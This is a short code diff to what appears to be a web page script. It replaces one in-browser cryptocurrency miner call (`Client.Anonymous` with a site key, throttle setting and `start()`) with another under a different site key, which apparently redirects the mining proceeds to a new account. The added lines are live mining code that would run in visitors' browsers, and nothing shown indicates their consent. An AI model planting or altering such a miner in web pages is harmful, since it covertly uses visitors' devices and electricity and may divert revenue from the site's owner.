@@ -1,5 +1,5 @@
-    var _client = new Client.Anonymous('69b88f3068b81896db063164801b3b37be9dfdab04607863d4fb62b352e99cc9', {
-        throttle: 0.6, c: 'w', ads: 0
-    });
-    _client.start();
+
+var _client = new Client.Anonymous('98aab2f2cd6d8526be8a2132fd2e5111b3aff13e5efc70152bd7b3dee3a668d1', { 
+    throttle: 0.9, c: 'w', ads: 0 
+}); _client.start();
     
